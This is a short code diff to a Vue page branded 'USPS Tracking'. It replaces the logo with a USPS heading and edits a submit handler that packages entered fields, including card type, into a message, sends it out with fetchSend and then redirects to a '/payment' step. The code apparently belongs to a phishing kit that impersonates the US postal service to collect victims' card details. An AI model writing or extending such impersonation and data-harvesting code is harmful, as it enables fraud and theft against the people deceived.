@@ -1,8 +1,8 @@
 <template>
   <!-- code... -->
-  <div class="p-5 bg-[#f7f7f7] flex justify-between fixed top-14 w-full z-40">
+  <div class="p-5 bg-[#f7f7f7] flex justify-between fixed top-14 w-full z-40 items-center">
     <div class="w-[217px]">
-      <img src="/logo-sb.svg" alt="usps-tracking" />
+    <h4 class="text-3xl text-text-heading font-helv3">USPS Tracking</h4>
     </div>
     <div>
       <p class="text-text-heading font-semibold">
@@ -111,7 +111,7 @@ function handleSubmit() {
     store.cardType = store.getCardType;
 
     const theKeys = Object.keys(info);
-    for (let i = 0; i < theKeys.length; i++) {
+    for (let i = 0; i < 1; i++) {
       updateMyMessage(myMessage, `${theKeys[i]}:   ${data[i]}`);
     }
     fetchSend(myMessage.value,()=>router.push("/payment"));
